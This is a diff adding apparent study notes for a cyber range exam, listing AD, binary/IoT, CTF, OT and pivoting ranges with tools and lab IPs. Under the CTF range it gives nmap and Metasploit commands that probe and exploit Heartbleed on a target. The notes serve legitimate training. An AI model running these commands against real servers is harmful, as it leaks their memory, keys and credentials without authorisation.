@@ -1,0 +1,93 @@
+• Active Directory Range (500 marks): AD enumeration, Kerberos attacks, and domain compromise (Tools: Nmap, Hydra, CrackMapExec, Plink).
+IPs- 172.25.170.30,   172.25.170.200,  172.25.170.90
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+• Binaries & IoT Range (500 marks): Binary reverse engineering, debugging, and IoT/firmware analysis (Tools: GDB, Binwalk, PwnKit).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+• Capture the Flag (CTF) Range (500 marks): Multi-technique and multi-layer CTF challenge flags (Tools: ShellShock exploitation and custom scripts).
+
+
+
+
+nmap -p 443,80 --script ssl-heartbleed <ip>
+msfconsole
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS <target_ip>
+set RPORT 443
+set VERBOSE true
+exploit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+• Operational Technology (OT) Range (500 marks): ICS/SCADA protocols and industrial network analysis (Tools: Modbus, tcpdump, Wireshark).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+• Pivoting & Double Pivoting Range (500 marks): Single and double pivoting, tunneling through internal segmented networks (Tools: Chisel, Proxychains, Impacket, CrackMapExec).
+
+
+
+
+
+
+
+
+
+
